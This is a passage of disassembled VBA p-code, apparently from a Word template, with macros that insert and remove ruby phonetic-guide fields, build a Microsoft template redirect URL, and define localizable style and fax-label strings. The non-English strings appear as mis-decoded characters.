Then \n' \tLd vbTab \n' \tFnInStr3 \n' \tLitDI2 0x0000 \n' \tNe \n' \tParen \n' \tOr \n' \tIfBlock \n' Line #16:\n' \tLitStr 0x0038 \"\u00b5L\u00aak\u00ac\u00b0\u00a7t\u00a6\u00b3\u00a9w\u00a6\u00ec\u00c2I\u00a1B\u00a5\\\u00af\u00e0\u00c5\u00dc\u00bc\u00c6\u00a9M\u00acq\u00b8\u00a8\u00b2\u00c5\u00b8\u00b9\u00aa\u00ba\u00a6r\u00a6\u00ea\u00a5[\u00a4J\u00a8\u00c3\u00a6C\u00aa\u00ba\u00b5\u00f9\u00b8\u00d1\"\n' \tLd SZ_MACRONAME \n' \tParamNamed Title \n' \tArgsCall MsgBox 0x0002 \n' Line #17:\n' \tGoTo LExit \n' \tBoS 0x0000 \n' Line #18:\n' \tEndIfBlock \n' Line #19:\n' \tEndIfBlock \n' Line #20:\n' \tLd Selection \n' \tMemLd Start \n' \tLd Selection \n' \tMemLd End \n' \tEq \n' \tParen \n' \tIfBlock \n' Line #21:\n' \tLitStr 0x0016 \"\u00bd\u00d0\u00bf\u00ef\u00a8\u00fa\u00adn\u00a5[\u00a4J\u00b5\u00f9\u00b8\u00d1\u00aa\u00ba\u00a6r\u00a6\u00ea\"\n' \tLd SZ_MACRONAME \n' \tParamNamed Title \n' \tArgsCall MsgBox 0x0002 \n' Line #22:\n' \tGoTo LExit \n' \tBoS 0x0000 \n' Line #23:\n' \tEndIfBlock \n' Line #24:\n' \tEndWith \n' Line #25:\n' \tArgsCall InitDialog 0x0000 \n' Line #26:\n' \tLd dlgRuby \n' \tArgsMemCall Show 0x0000 \n' Line #27:\n' \tLabel LExit \n' Line #28:\n' \tEndSub \n' Line #29:\n' Line #30:\n' \tFuncDefn (Sub Create(szRuby As String, szFont As String, iSize As Integer, iDist As Integer, szAlign As String))\n' Line #31:\n' \tDim \n' \tVarDefn rgn (As Range)\n' Line #32:\n' \tDim \n' \tVarDefn n (As Integer)\n' Line #33:\n' \tDim \n' \tVarDefn iCurSize (As Integer)\n' Line #34:\n' \tDim \n' \tVarDefn szCurFont (As String)\n' Line #35:\n' \tDim \n' \tVarDefn fnt (As Font)\n' Line #36:\n' \tLitVarSpecial (False)\n' \tLd Application \n' \tMemSt ScreenUpdating \n' Line #37:\n' \tLd wdCursorWait \n' \tLd System \n' \tMemSt Cursor \n' Line #38:\n' Line #39:\n' \tOnError LError \n' Line #40:\n' \tStartWithExpr \n' \tLd Selection \n' \tWith \n' Line #41:\n' \tSetStmt \n' \tMemLdWith Range \n' \tSet rgn \n' Line #42:\n' \tSetStmt \n' \tLd rgn \n' \tArgsLd GetCurFont 0x0001 \n' \tSet fnt \n' Line #43:\n' \tLd rgn \n' \tArgsLd FIsRubyField 0x0001 \n' \tLitVarSpecial (True)\n' \tEq \n' \tParen \n' \tIfBlock \n' Line #44:\n' \tArgsCall Delete 0x0000 \n' Line #45:\n' \tEndIfBlock \n' Line #46:\n' Line #47:\n' \tLd fnt \n' \tMemLd Size \n' \tSt iCurSize \n' Line #48:\n' \tLd fnt \n' \tMemLd New \n' \tSt szCurFont \n' Line #49:\n' \tMemLdWith Then \n' \tFnLen \n' \tSt n \n' Line #50:\n' Line #51:\n' \tQuoteRem 0x0008 0x000D \" Insert Field\"\n' Line #52:\n' \tMemLdWith Range \n' \tParamOmitted \n' \tParamOmitted \n' \tLitVarSpecial (False)\n' \tMemLdWith Fields \n' \tArgsMemCall Add 0x0004 \n' Line #53:\n' \tLitStr 0x0005 \"eq \\o\"\n' \tArgsMemCallWith TypeText 0x0001 \n' Line #54:\n' Line #55:\n' \tQuoteRem 0x0008 0x0012 \" Ruby string align\"\n' Line #56:\n' \tLd szAlign \n' \tParen \n' \tSelectCase \n' Line #57:\n' \tLitStr 0x0004 \"\u00bea\u00a5\u00aa\"\n' \tCase \n' \tCaseDone \n' Line #58:\n' \tLitStr 0x0003 \"\\al\"\n' \tArgsMemCallWith TypeText 0x0001 \n' Line #59:\n' \tLitStr 0x000A \"\u00b5\u00a5\u00b6\u00a1\u00b6Z\u00aei\u00b6}\"\n' \tCase \n' \tCaseDone \n' Line #60:\n' \tLitStr 0x0003 \"\\ad\"\n' \tArgsMemCallWith TypeText 0x0001 \n' Line #61:\n' \tCaseElse \n' Line #62:\n' \tEndSelect \n' Line #63:\n' Line #64:\n' \tLitStr 0x0006 \"(\\s\\up\"\n' \tLd iDist \n' \tMemLdWith Font \n' \tMemLd Size \n' \tAdd \n' \tLitDI2 0x0001 \n' \tSub \n' \tFnInt \n' \tArgsLd Str$ 0x0001 \n' \tAdd \n' \tLitStr 0x0001 \"(\"\n' \tAdd \n' \tArgsMemCallWith TypeText 0x0001 \n' Line #65:\n' \tLd szRuby \n' \tArgsMemCallWith InsertBefore 0x0001 \n' Line #66:\n' \tLd iSize \n' \tMemLdWith Font \n' \tMemSt Size \n' Line #67:\n' \tLd szFont \n' \tMemLdWith Font \n' \tMemSt New \n' Line #68:\n' \tLitVarSpecial (False)\n' \tMemLdWith Font \n' \tMemSt DisableCharacterSpaceGrid \n' Line #69:\n' \tArgsMemCallWith MoveRight 0x0000 \n' Line #70:\n' \tLitStr 0x0002 \"),\"\n' \tArgsMemCallWith InsertAfter 0x0001 \n' Line #71:\n' \tLd iCurSize \n' \tMemLdWith Font \n' \tMemSt Size \n' Line #72:\n' \tLd szCurName \n' \tMemLdWith Font \n' \tMemSt New \n' Line #73:\n' \tParamOmitted \n' \tLd n \n' \tLitDI2 0x0002 \n' \tAdd \n' \tArgsMemCallWith MoveRight 0x0002 \n' Line #74:\n' \tLitStr 0x0001 \")\"\n' \tArgsMemCallWith TypeText 0x0001 \n' Line #75:\n' \tQuoteRem 0x0008 0x0031 \" Kludge, To remove space char at end of field....\"\n' Line #76:\n' \tParamOmitted \n' \tLitDI2 0x0002 \n' \tArgsMemCallWith MoveLeft 0x0002 \n' Line #77:\n' \tLd wdCharacter \n' \tParamNamed unit \n' \tLitDI2 0x0001 \n' \tParamNamed Count \n' \tArgsMemCallWith Delete 0x0002 \n' Line #78:\n' Line #79:\n' \tMemLdWith Fields \n' \tArgsMemCall ToggleShowCodes 0x0000 \n' Line #80:\n' \tParamOmitted \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tArgsMemCallWith MoveRight 0x0003 \n' Line #81:\n' Line #82:\n' \tEndWith \n' Line #83:\n' \tLabel LExit \n' Line #84:\n' \tLitVarSpecial (True)\n' \tLd Application \n' \tMemSt ScreenUpdating \n' Line #85:\n' \tLd wdCursorNormal \n' \tLd System \n' \tMemSt Cursor \n' Line #86:\n' \tExitSub \n' Line #87:\n' \tLabel LError \n' Line #88:\n' \tLd Err \n' \tMemLd Description \n' \tLd SZ_MACRONAME \n' \tParamNamed Title \n' \tArgsCall MsgBox 0x0002 \n' Line #89:\n' \tEndSub \n' Line #90:\n' Line #91:\n' \tFuncDefn (Sub Delete())\n' Line #92:\n' \tDim \n' \tVarDefn rgn (As Range)\n' Line #93:\n' \tDim \n' \tVarDefn rgnFld (As Range)\n' Line #94:\n' \tDim \n' \tVarDefn rgnNew (As Range)\n' Line #95:\n' \tDim \n' \tVarDefn szCode (As String)\n' Line #96:\n' \tDim \n' \tVarDefn FUpdate (As Boolean)\n' Line #97:\n' Line #98:\n' \tOnError LError \n' Line #99:\n' \tLd Application \n' \tMemLd ScreenUpdating \n' \tLitVarSpecial (True)\n' \tEq \n' \tParen \n' \tIfBlock \n' Line #100:\n' \tLitVarSpecial (True)\n' \tSt FUpdate \n' Line #101:\n' \tLitVarSpecial (False)\n' \tLd Application \n' \tMemSt ScreenUpdating \n' Line #102:\n' \tLd wdCursorWait \n' \tLd System \n' \tMemSt Cursor \n' Line #103:\n' \tElseBlock \n' Line #104:\n' \tLitVarSpecial (False)\n' \tSt FUpdate \n' Line #105:\n' \tEndIfBlock \n' Line #106:\n' Line #107:\n' \tStartWithExpr \n' \tLd Selection \n' \tWith \n' Line #108:\n' \tSetStmt \n' \tMemLdWith Range \n' \tSet rgn \n' Line #109:\n' \tMemLdWith Fields \n' \tMemLd Count \n' \tLitDI2 0x0001 \n' \tLt \n' \tParen \n' \tIf \n' \tBoSImplicit \n' \tGoTo LExit \n' \tBoS 0x0000 \n' \tEndIf \n' Line #110:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tMemLdWith Fields \n' \tMemLd Count \n' \tFor \n' Line #111:\n' \tLd i \n' \tLd rgn \n' \tArgsMemLd Fields 0x0001 \n' \tMemLd Code \n' \tSt szCode \n' Line #112:\n' \tSetStmt \n' \tLd i \n' \tLd rgn \n' \tArgsMemLd Fields 0x0001 \n' \tMemLd Code \n' \tSet rgnFld \n' Line #113:\n' \tLd rgn \n' \tArgsLd FIsRubyField 0x0001 \n' \tLitVarSpecial (False)\n' \tEq \n' \tParen \n' \tIfBlock \n' Line #114:\n' \tGoTo LExit \n' \tBoS 0x0000 \n' Line #115:\n' \tEndIfBlock \n' Line #116:\n' Line #117:\n' \tLitDI2 0x0001 \n' \tLd szCode \n' \tLitStr 0x0001 \",\"\n' \tFnInStr3 \n' \tLd rgnFld \n' \tMemLd Start \n' \tAdd \n' \tSt iTop \n' Line #118:\n' \tLd rgnFld \n' \tMemLd End \n' \tLitDI2 0x0001 \n' \tSub \n' \tSt iEnd \n' Line #119:\n' \tLd iTop \n' \tLd iEnd \n' \tLd rgnFld \n' \tArgsMemCall SetRange 0x0002 \n' Line #120:\n' Line #121:\n' \tArgsMemCallWith MoveLeft 0x0000 \n' Line #122:\n' \tSetStmt \n' \tLd Selection \n' \tMemLd Range \n' \tSet rgnNew \n' Line #123:\n' \tLd rgnFld \n' \tMemLd FormattedText \n' \tLd rgnNew \n' \tMemSt FormattedText \n' Line #124:\n' \tParamOmitted \n' \tLd rgnFld \n' \tMemLd Then \n' \tFnLen \n' \tArgsMemCallWith MoveRight 0x0002 \n' Line #125:\n' \tParamOmitted \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tArgsMemCallWith MoveRight 0x0003 \n' Line #126:\n' \tArgsMemCallWith Delete 0x0000 \n' Line #127:\n' \tLd rgnNew \n' \tArgsMemCall Set 0x0000 \n' Line #128:\n' Line #129:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tNextVar \n' Line #130:\n' \tEndWith \n' Line #131:\n' \tLabel LExit \n' Line #132:\n' \tLd FUpdate \n' \tLitVarSpecial (True)\n' \tEq \n' \tParen \n' \tIfBlock \n' Line #133:\n' \tLitVarSpecial (True)\n' \tLd Application \n' \tMemSt ScreenUpdating \n' Line #134:\n' \tLd wdCursorNormal \n' \tLd System \n' \tMemSt Cursor \n' Line #135:\n' \tEndIfBlock \n' Line #136:\n' \tExitSub \n' Line #137:\n' \tLabel LError \n' Line #138:\n' \tLd Err \n' \tMemLd Description \n' \tLd SZ_MACRONAME \n' \tParamNamed Title \n' \tArgsCall MsgBox 0x0002 \n' Line #139:\n' \tEndSub \n' Line #140:\n' Line #141:\n' \tFuncDefn (Sub InitDialog())\n' Line #142:\n' \tDim \n' \tVarDefn i (As Integer)\n' Line #143:\n' \tDim \n' \tVarDefn n (As Integer)\n' Line #144:\n' \tDim \n' \tVarDefn szFont (As String)\n' Line #145:\n' \tDim \n' \tVarDefn szCode (As String)\n' Line #146:\n' \tDim \n' \tVarDefn fnt (As Font)\n' Line #147:\n' \tDim \n' \tVarDefn fntRuby (As Font)\n' Line #148:\n' Line #149:\n' \tOnError LError \n' \tBoS 0x0000 \n' Line #150:\n' \tLitVarSpecial (False)\n' \tLd Application \n' \tMemSt ScreenUpdating \n' Line #151:\n' \tLd wdCursorWait \n' \tLd System \n' \tMemSt Cursor \n' Line #152:\n' Line #153:\n' \tLd dlgRuby \n' \tMemLd IDCD_ALIGN \n' \tArgsMemCall Clear 0x0000 \n' Line #154:\n' \tLitStr 0x0004 \"\u00bea\u00a5\u00aa\"\n' \tLd dlgRuby \n' \tMemLd IDCD_ALIGN \n' \tArgsMemCall AddItem 0x0001 \n' Line #155:\n' \tLitStr 0x0004 \"\u00b8m\u00a4\u00a4\"\n' \tLd dlgRuby \n' \tMemLd IDCD_ALIGN \n' \tArgsMemCall AddItem 0x0001 \n' Line #156:\n' \tLitStr 0x000A \"\u00b5\u00a5\u00b6\u00a1\u00b6Z\u00aei\u00b6}\"\n' \tLd dlgRuby \n' \tMemLd IDCD_ALIGN \n' \tArgsMemCall AddItem 0x0001 \n' Line #157:\n' Line #158:\n' \tStartWithExpr \n' \tLd Selection \n' \tWith \n' Line #159:\n' \tSetStmt \n' \tMemLdWith Range \n' \tArgsLd GetCurFont 0x0001 \n' \tSet fnt \n' Line #160:\n' \tMemLdWith Range \n' \tArgsLd FIsRubyField 0x0001 \n' \tLitVarSpecial (True)\n' \tEq \n' \tParen \n' \tIfBlock \n' Line #161:\n' \tLitVarSpecial (True)\n' \tLd dlgRuby \n' \tMemLd ID_RESET \n' \tMemSt Enabled \n' Line #162:\n' \tQuoteRem 0x000C 0x001A \" Get Selected Field Values\"\n' Line #163:\n' \tQuoteRem 0x000C 0x0020 \" { eq \\o\\ad(\\s\\up 12(foo),bar) }\"\n' Line #164:\n' \tDim \n' \tVarDefn rgn (As Range)\n' Line #165:\n' \tLitDI2 0x0001 \n' \tArgsMemLdWith Fields 0x0001 \n' \tArgsMemCall Set 0x0000 \n' Line #166:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tArgsMemLdWith Fields 0x0001 \n' \tMemLd Code \n' \tSet rgn \n' Line #167:\n' \tLitDI2 0x0001 \n' \tArgsMemLdWith Fields 0x0001 \n' \tMemLd Code \n' \tMemLd Then \n' \tSt szCode \n' Line #168:\n' Line #169:\n' \tQuoteRem 0x000C 0x0020 \" { eq \\o\\ad(\\s\\up 12(foo),bar) }\"\n' Line #170:\n' \tQuoteRem 0x000C 0x0018 \"                     ~~~\"\n' Line #171:\n' \tLitDI2 0x000B \n' \tLd szCode \n' \tLitStr 0x0001 \"(\"\n' \tFnInStr3 \n' \tSt iTop \n' Line #172:\n' \tLitDI2 0x0001 \n' \tLd szCode \n' \tLitStr 0x0001 \",\"\n' \tFnInStr3 \n' \tLitDI2 0x0002 \n' \tSub \n' \tSt iEnd \n' Line #173:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tArgsMemLdWith Fields 0x0001 \n' \tMemLd Code \n' \tSet rgn \n' Line #174:\n' \tLd rgn \n' \tMemLd Start \n' \tLd iTop \n' \tAdd \n' \tLd rgn \n' \tMemLd Start \n' \tLd iEnd \n' \tAdd \n' \tLd rgn \n' \tArgsMemCall SetRange 0x0002 \n' Line #175:\n' \tSetStmt \n' \tLd rgn \n' \tArgsLd GetCurFont 0x0001 \n' \tSet fntRuby \n' Line #176:\n' \tLd fntRuby \n' \tMemLd NameFarEast \n' \tLd dlgRuby \n' \tMemLd IDCT_FONT \n' \tMemSt Caption \n' Line #177:\n' \tLd fntRuby \n' \tMemLd Size \n' \tLd dlgRuby \n' \tMemLd IDCT_SIZE \n' \tMemSt Caption \n' Line #178:\n' \tLd rgn \n' \tMemLd Then \n' \tLd dlgRuby \n' \tMemSt IDCE_TEXT \n' Line #179:\n' Line #180:\n' \tQuoteRem 0x000C 0x0020 \" { eq \\o\\ad(\\s\\up 12(foo),bar) }\"\n' Line #181:\n' \tQuoteRem 0x000C 0x0014 \"                  ~~\"\n' Line #182:\n' \tLitDI2 0x0001 \n' \tLd szCode \n' \tLitStr 0x0003 \"up \"\n' \tFnInStr3 \n' \tLitDI2 0x0002 \n' \tAdd \n' \tSt iTop \n' Line #183:\n' \tLitDI2 0x000B \n' \tLd szCode \n' \tLitStr 0x0001 \"(\"\n' \tFnInStr3 \n' \tSt iEnd \n' Line #184:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tArgsMemLdWith Fields 0x0001 \n' \tMemLd Code \n' \tSet rgn \n' Line #185:\n' \tLd rgn \n' \tMemLd Start \n' \tLd iTop \n' \tAdd \n' \tLd rgn \n' \tMemLd Start \n' \tLd iEnd \n' \tAdd \n' \tLd rgn \n' \tArgsMemCall SetRange 0x0002 \n' Line #186:\n' \tLd szCode \n' \tLd iTop \n' \tLd iEnd \n' \tLd iTop \n' \tSub \n' \tArgsLd Mid$$ 0x0003 \n' \tArgsLd Val 0x0001 \n' \tLd fnt \n' \tMemLd Size \n' \tFnInt \n' \tSub \n' \tLitDI2 0x0001 \n' \tAdd \n' \tLd dlgRuby \n' \tMemSt IDCE_DIST \n' Line #187:\n' Line #188:\n' \tQuoteRem 0x000C 0x0020 \" { eq \\o\\ad(\\s\\up 12(foo),bar) }\"\n' Line #189:\n' \tQuoteRem 0x000C 0x000B \"        ~~~\"\n' Line #190:\n' \tLitDI2 0x0001 \n' \tLd szCode \n' \tLitStr 0x0003 \"\\al\"\n' \tFnInStr3 \n' \tLitDI2 0x0000 \n' \tGt \n' \tParen \n' \tIfBlock \n' Line #191:\n' \tLitDI2 0x0000 \n' \tLd dlgRuby \n' \tMemLd IDCD_ALIGN \n' \tMemSt ListIndex \n' Line #192:\n' \tLitDI2 0x0001 \n' \tLd szCode \n' \tLitStr 0x0003 \"\\ad\"\n' \tFnInStr3 \n' \tLitDI2 0x0000 \n' \tGt \n' \tParen \n' \tElseIfBlock \n' Line #193:\n' \tLitDI2 0x0002 \n' \tLd dlgRuby \n' \tMemLd IDCD_ALIGN \n' \tMemSt ListIndex \n' Line #194:\n' \tElseBlock \n' Line #195:\n' \tLitDI2 0x0001 \n' \tLd dlgRuby \n' \tMemLd IDCD_ALIGN \n' \tMemSt ListIndex \n' Line #196:\n' \tEndIfBlock \n' Line #197:\n' \tElseBlock \n' Line #198:\n' \tLitVarSpecial (False)\n' \tLd dlgRuby \n' \tMemLd ID_RESET \n' \tMemSt Enabled \n' Line #199:\n' \tLitStr 0x0000 \"\"\n' \tLd dlgRuby \n' \tMemSt IDCE_TEXT \n' Line #200:\n' \tLitDI2 0x0000 \n' \tArgsLd Str$ 0x0001 \n' \tLd dlgRuby \n' \tMemSt IDCE_DIST \n' Line #201:\n' \tLd fnt \n' \tMemLd Size \n' \tLitDI2 0x0002 \n' \tDiv \n' \tFnInt \n' \tLd dlgRuby \n' \tMemLd IDCT_SIZE \n' \tMemSt Caption \n' Line #202:\n' \tLd fnt \n' \tMemLd NameFarEast \n' \tLd dlgRuby \n' \tMemLd IDCT_FONT \n' \tMemSt Caption \n' Line #203:\n' \tLitDI2 0x0001 \n' \tLd dlgRuby \n' \tMemLd IDCD_ALIGN \n' \tMemSt ListIndex \n' Line #204:\n' \tEndIfBlock \n' Line #205:\n' \tLd fmIMEModeNoControl \n' \tLd dlgRuby \n' \tMemLd IDCE_TEXT \n' \tMemSt IMEMode \n' Line #206:\n' \tLd dlgRuby \n' \tMemLd IDCE_TEXT \n' \tArgsMemCall SetFocus 0x0000 \n' Line #207:\n' \tLitDI2 0x0000 \n' \tLd dlgRuby \n' \tMemLd IDCE_TEXT \n' \tMemSt SelStart \n' Line #208:\n' \tLitDI2 0x0063 \n' \tLd dlgRuby \n' \tMemLd IDCE_TEXT \n' \tMemSt SelLength \n' Line #209:\n' \tLd dlgRuby \n' \tMemLd IDCE_TEXT \n' \tMemLd Then \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tParen \n' \tIfBlock \n' Line #210:\n' \tLitVarSpecial (True)\n' \tLd dlgRuby \n' \tMemLd IDOK \n' \tMemSt Enabled \n' Line #211:\n' \tElseBlock \n' Line #212:\n' \tLitVarSpecial (False)\n' \tLd dlgRuby \n' \tMemLd IDOK \n' \tMemSt Enabled \n' Line #213:\n' \tEndIfBlock \n' Line #214:\n' \tEndWith \n' Line #215:\n' Line #216:\n' \tLitVarSpecial (True)\n' \tLd Application \n' \tMemSt ScreenUpdating \n' Line #217:\n' \tLd wdCursorNormal \n' \tLd System \n' \tMemSt Cursor \n' Line #218:\n' \tExitSub \n' Line #219:\n' \tLabel LError \n' Line #220:\n' \tLd Err \n' \tMemLd Description \n' \tLd SZ_MACRONAME \n' \tParamNamed Title \n' \tArgsCall MsgBox 0x0002 \n' Line #221:\n' \tEndSub \n' Line #222:\n' Line #223:\n' \tFuncDefn (Function FIsRubyField(rgn As , id_FFFE As Boolean) As Boolean)\n' Line #224:\n' \tLitVarSpecial (False)\n' \tSt FIsRubyField \n' Line #225:\n' \tLd rgn \n' \tMemLd Fields \n' \tMemLd Count \n' \tLitDI2 0x0000 \n' \tEq \n' \tParen \n' \tIf \n' \tBoSImplicit \n' \tExitFunc \n' \tEndIf \n' Line #226:\n' \tLitDI2 0x0001 \n' \tLd rgn \n' \tArgsMemLd Fields 0x0001 \n' \tMemLd Code \n' \tMemLd Then \n' \tSt a$ \n' Line #227:\n' \tQuoteRem 0x0004 0x0020 \" { eq \\o\\ad(\\s\\up 12(foo),bar) }\"\n' Line #228:\n' \tQuoteRem 0x0004 0x0040 \"   ~~~~~   ~~~~~~ and \"),\\s\\do\" is only contained Kumimoji field\"\n' Line #229:\n' \tLineCont 0x0004 25 00 08 00\n' \tLd a$ \n' \tLitDI2 0x0006 \n' \tArgsLd LBound$ 0x0002 \n' \tLitStr 0x0006 \" eq \\o\"\n' \tEq \n' \tParen \n' \tLitDI2 0x0006 \n' \tLd a$ \n' \tLitStr 0x0006 \"(\\s\\up\"\n' \tFnInStr3 \n' \tLitDI2 0x0000 \n' \tNe \n' \tParen \n' \tAnd \n' \tLitDI2 0x0009 \n' \tLd a$ \n' \tLitStr 0x0007 \"),\\s\\do\"\n' \tFnInStr3 \n' \tLitDI2 0x0000 \n' \tEq \n' \tParen \n' \tAnd \n' \tLd a$ \n' \tLitDI2 0x0001 \n' \tArgsLd Right$ 0x0002 \n' \tLitStr 0x0001 \")\"\n' \tEq \n' \tParen \n' \tAnd \n' \tIfBlock \n' Line #230:\n' \tLitVarSpecial (True)\n' \tSt FIsRubyField \n' Line #231:\n' \tEndIfBlock \n' Line #232:\n' \tEndFunc \n' Line #233:\n' Line #234:\n' Line #235:\n' \tFuncDefn (Function BuildRedirString(id_FFFE As String))\n' Line #236:\n' Line #237:\n' \tDim \n' \tVarDefn RedirString\n' Line #238:\n' \tDim \n' \tLitDI2 0x0000 \n' \tLitDI2 0x000B \n' \tVarDefn Arg\n' Line #239:\n' \tDim \n' \tVarDefn OS (As String)\n' Line #240:\n' Line #241:\n' \tLd System \n' \tMemLd OperatingSystem \n' \tSelectCase \n' Line #242:\n' \tLitStr 0x0007 \"Windows\"\n' \tCase \n' \tCaseDone \n' Line #243:\n' \tLitStr 0x0003 \"Win\"\n' \tSt OS \n' Line #244:\n' \tLitStr 0x000A \"Windows NT\"\n' \tCase \n' \tCaseDone \n' Line #245:\n' \tLitStr 0x0005 \"WinNT\"\n' \tSt OS \n' Line #246:\n' \tLitStr 0x0009 \"Macintosh\"\n' \tCase \n' \tCaseDone \n' Line #247:\n' \tLitStr 0x0003 \"Mac\"\n' \tSt OS \n' Line #248:\n' \tCaseElse \n' Line #249:\n' \tLitStr 0x0003 \"Win\"\n' \tSt OS \n' Line #250:\n' \tEndSelect \n' Line #251:\n' Line #252:\n' \tLitStr 0x0029 \"http://www.microsoft.com/isapi/redir.dll?\"\n' \tSt RedirString$ \n' Line #253:\n' Line #254:\n' \tLitStr 0x0008 \"PRD=Word\"\n' \tLitDI2 0x0000 \n' \tArgsSt Arg$ 0x0001 \n' Line #255:\n' \tLitStr 0x0007 \"&SBP=ia\"\n' \tLitDI2 0x0001 \n' \tArgsSt Arg$ 0x0001 \n' Line #256:\n' \tLitStr 0x0007 \"&PLCID=\"\n' \tLd wdProductLanguageID \n' \tLd Application \n' \tArgsMemLd International 0x0001 \n' \tConcat \n' \tLitDI2 0x0002 \n' \tArgsSt Arg$ 0x0001 \n' Line #257:\n' \tLitStr 0x0006 \"&PVER=\"\n' \tLd Application \n' \tMemLd Version \n' \tConcat \n' \tLitDI2 0x0003 \n' \tArgsSt Arg$ 0x0001 \n' Line #258:\n' \tLitStr 0x0004 \"&OS=\"\n' \tLd OS \n' \tConcat \n' \tLitDI2 0x0004 \n' \tArgsSt Arg$ 0x0001 \n' Line #259:\n' \tLitStr 0x0006 \"&OVER=\"\n' \tLd System \n' \tMemLd Version \n' \tConcat \n' \tLitDI2 0x0005 \n' \tArgsSt Arg$ 0x0001 \n' Line #260:\n' \tLitStr 0x0007 \"&OLCID=\"\n' \tLitDI2 0x0006 \n' \tArgsSt Arg$ 0x0001 \n' \tQuoteRem 0x0014 0x0018 \"intentionally left blank\"\n' Line #261:\n' \tLitStr 0x0007 \"&CLCID=\"\n' \tLitStr 0x0002 \"0x\"\n' \tConcat \n' \tLitStr 0x0000 \"\"\n' \tLitStr 0x002D \"HKEY_CURRENT_USER\\Control Panel\\International\"\n' \tLitStr 0x0006 \"Locale\"\n' \tLd System \n' \tArgsMemLd PrivateProfileString 0x0003 \n' \tConcat \n' \tLitDI2 0x0007 \n' \tArgsSt Arg$ 0x0001 \n' Line #262:\n' \tLitStr 0x000D \"&AR=templates\"\n' \tLitDI2 0x0008 \n' \tArgsSt Arg$ 0x0001 \n' Line #263:\n' \tLitStr 0x0004 \"&O1=\"\n' \tLitDI2 0x0009 \n' \tArgsSt Arg$ 0x0001 \n' Line #264:\n' \tLitStr 0x0004 \"&O2=\"\n' \tLitDI2 0x000A \n' \tArgsSt Arg$ 0x0001 \n' Line #265:\n' \tLitStr 0x0004 \"&O3=\"\n' \tLitDI2 0x000B \n' \tArgsSt Arg$ 0x0001 \n' Line #266:\n' Line #267:\n' Line #268:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0000 \n' \tLitDI2 0x000B \n' \tFor \n' Line #269:\n' \tLd RedirString$ \n' \tLd i \n' \tArgsLd Arg$ 0x0001 \n' \tConcat \n' \tSt RedirString$ \n' Line #270:\n' \tStartForVariable \n' \tNext \n' Line #271:\n' Line #272:\n' \tLd RedirString$ \n' \tSt BuildRedirString$ \n' Line #273:\n' Line #274:\n' \tEndFunc \n' Line #275:\n' Line #276:\n' \tFuncDefn (Sub UpdateLink())\n' Line #277:\n' \tDim \n' \tVarDefn Anchor (As Range)\n' Line #278:\n' \tStartForVariable \n' \tLd Hlink \n' \tEndForVariable \n' \tLd ActiveDocument \n' \tMemLd Hyperlinks \n' \tForEach \n' \tQuoteRem 0x0030 0x001D \"look at all hyperlinks in doc\"\n' Line #279:\n' \tLd Hlink \n' \tMemLd Address \n' \tLitStr 0x004E \"http://www.microsoft.com/isapi/redir.dll?PRD=Word&SBP=ia&PVER=8.0&AR=templates\"\n' \tEq \n' \tIfBlock \n' \tQuoteRem 0x0071 0x001A \"look for address to change\"\n' Line #280:\n' \tLd Hlink \n' \tMemLd TypeOf \n' \tLd msoHyperlinkRange \n' \tEq \n' \tIfBlock \n' \tQuoteRem 0x0033 0x001A \"get Anchor - Text Or Shape\"\n' Line #281:\n' \tSetStmt \n' \tLd Hlink \n' \tMemLd Range \n' \tSet Anchor \n' \tQuoteRem 0x0030 0x000B \"text anchor\"\n' Line #282:\n' \tElseBlock \n' Line #283:\n' \tSetStmt \n' \tLd Hlink \n' \tMemLd Shape \n' \tSet Anchor \n' \tQuoteRem 0x0030 0x000C \"shape anchor\"\n' Line #284:\n' \tEndIfBlock \n' Line #285:\n' \tLd Hlink \n' \tArgsMemCall Delete 0x0000 \n' \tQuoteRem 0x0024 0x000F \"delete old link\"\n' Line #286:\n' \tLd Anchor \n' \tArgsLd BuildRedirString 0x0000 \n' \tLd ActiveDocument \n' \tMemLd Hyperlinks \n' \tArgsMemCall Add 0x0002 \n' \tQuoteRem 0x0046 0x001B \"add new hlink in same place\"\n' Line #287:\n' \tEndIfBlock \n' Line #288:\n' \tStartForVariable \n' \tNext \n' Line #289:\n' \tEndSub \n' Line #290:\n' Line #291:\n' \tOption  (Explicit)\n' Line #292:\n' Line #293:\n' \tQuoteRem 0x0000 0x0010 \"Standard Claimer\"\n' Line #294:\n' Line #295:\n' \tQuoteRem 0x0000 0x004F \"'******************************************************************************\"\n' Line #296:\n' \tQuoteRem 0x0000 0x000F \"TO BE LOCALIZED\"\n' Line #297:\n' \tQuoteRem 0x0000 0x004F \"'******************************************************************************\"\n' Line #298:\n' \tQuoteRem 0x0000 0x000B \"Style names\"\n' Line #299:\n' \tReparse 0x0040 \"Public Const strSTY_RETURN_ADDR     As String = \"Return Address\"\"\n' Line #300:\n' \tReparse 0x0040 \"Public Const strSTY_DOC_LABEL       As String = \"Document Label\"\"\n' Line #301:\n' \tReparse 0x003E \"Public Const strSTY_COMPANY_NAME    As String = \"Company Name\"\"\n' Line #302:\n' \tReparse 0x0046 \"Public Const strSTY_MSG_HDR_FIRST   As String = \"Message Header First\"\"\n' Line #303:\n' \tReparse 0x0046 \"Public Const strSTY_MSG_HDR_LABEL   As String = \"Message Header Label\"\"\n' Line #304:\n' \tReparse 0x0045 \"Public Const strSTY_MSG_HDR_LAST    As String = \"Message Header Last\"\"\n' Line #305:\n' Line #306:\n' \tQuoteRem 0x0000 0x000C \"misc strings\"\n' Line #307:\n' \tReparse 0x002C \"Public Const strPHONE   As String = \"\u00b9q\u00b8\u00dc\u00a1G\"\"\n' Line #308:\n' \tReparse 0x0030 \"Public Const strFAX     As String = \"\u00b6\u00c7\u00afu\u00b9q\u00b8\u00dc\u00a1G\"\"\n' Line #309:\n' \tReparse 0x002E \"Public Const strPAGES   As String = \"\u00c1`\u00ad\u00b6\u00bc\u00c6\u00a1G\"\"\n' Line #310:\n' \tReparse 0x002E \"Public Const strTO      As String = \"\u00a6\u00ac\u00a5\u00f3\u00aa\u00cc\u00a1G\"\"\n' Line #311:\n' \tReparse 0x002E \"Public Const strFROM    As String = 